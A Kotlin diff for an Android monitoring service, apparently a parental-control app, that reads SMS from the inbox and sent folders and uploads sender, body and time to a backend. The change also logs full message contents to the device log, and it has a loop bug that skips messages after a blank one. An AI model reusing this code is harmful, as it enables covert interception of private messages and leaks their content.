@@ -34,6 +34,7 @@ class MyForegroundService : Service() {
     private val handler = Handler(Looper.getMainLooper())
     private var childId: Int = -1
     private var isMonitoring = false
+    private var lastSmsTimestamp: Long = 0L 
 
     // Service create hoti hai
     override fun onCreate() {
@@ -221,51 +222,81 @@ class MyForegroundService : Service() {
             }
         })
     }
-    // Collect SMS from inbox
-    private fun collectAndSendSms() {
-    if (childId == -1) return
+    
+    
+// SMS Collection ( Inbox + Sent )
 
-    try {
-        val cursor = contentResolver.query(
-            android.net.Uri.parse("content://sms/inbox"),
-            arrayOf("address", "body", "date"),
-            null, null,
-            "date DESC LIMIT 20"
-        ) ?: return
+private fun collectAndSendSms() {
+    if (childId == -1) {
+        Log.e("MONITOR_SERVICE", "SMS: child_id not set — skipping")
+        return
+    }
 
-        cursor.use {
-            while (it.moveToNext()) {
-                val sender  = it.getString(0) ?: ""
-                val body    = it.getString(1) ?: ""
-                val dateMs  = it.getLong(2)
+    // Pehli baar service start ho toh last 1 ghante ki SMS lo
+    // Baad mein sirf naye SMS jayenge
+    if (lastSmsTimestamp == 0L) {
+        lastSmsTimestamp = System.currentTimeMillis() - (60 * 60 * 1000)
+    }
 
-                // Last 10 min ki SMS hi bhejo — duplicate avoid
-                val tenMinAgo = System.currentTimeMillis() - (10 * 60 * 1000)
-                if (dateMs < tenMinAgo) continue
-                if (body.isBlank()) continue
+    val inboxUri = android.net.Uri.parse("content://sms/inbox")
+    val sentUri  = android.net.Uri.parse("content://sms/sent")
 
-                sendChatToBackend(
-                    appName = "SMS",
-                    sender  = sender,
-                    message = body,
-                    date    = dateMs
-                )
-                // Timestamp 
-                if (dateMs > lastSmsTimestamp) {
-                    lastSmsTimestamp = dateMs
+    var newLastTimestamp = lastSmsTimestamp
+
+    listOf(
+        Pair(inboxUri, "SMS_Inbox"),
+        Pair(sentUri,  "SMS_Sent")
+    ).forEach { (uri, type) ->
+        try {
+            val cursor = contentResolver.query(
+                uri,
+                arrayOf("address", "body", "date"),
+                "date > ?",
+                arrayOf(lastSmsTimestamp.toString()),
+                "date ASC"
+            ) ?: return@forEach
+
+            cursor.use {
+                while (it.moveToNext()) {
+                    val sender  = it.getString(0) ?: "Unknown"
+                    val body    = it.getString(1) ?: ""
+                    val dateMs  = it.getLong(2)
+
+                    if (body.isBlank()) return@use
+
+                    Log.d("MONITOR_SERVICE", "$type | From: $sender | Msg: $body")
+
+                    sendChatToBackend(
+                        appName   = type,
+                        sender    = sender,
+                        message   = body,
+                        dateMs    = dateMs
+                    )
+
+                    // Sabse naye SMS ka timestamp track karo
+                    if (dateMs > newLastTimestamp) {
+                        newLastTimestamp = dateMs
+                    }
                 }
             }
+
+        } catch (e: Exception) {
+            Log.e("MONITOR_SERVICE", "$type Error: ${e.message}")
         }
-    } catch (e: Exception) {
-        Log.e("MONITOR_SERVICE", "SMS Error: ${e.message}")
     }
+
+    // Timestamp 
+    lastSmsTimestamp = newLastTimestamp
 }
+
+
+// Sending CHat to Backend
 
 private fun sendChatToBackend(
     appName: String,
     sender: String,
     message: String,
-    date: Long
+    dateMs: Long
 ) {
     val sdf = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss", Locale.getDefault())
 
@@ -274,8 +305,10 @@ private fun sendChatToBackend(
         put("app_name",  appName)
         put("sender",    sender)
         put("message",   message)
-        put("timestamp", sdf.format(Date(date)))
+        put("timestamp", sdf.format(Date(dateMs)))
     }
+
+    Log.d("MONITOR_SERVICE", "Sending chat: $json")
 
     val client = OkHttpClient()
     val body   = json.toString()
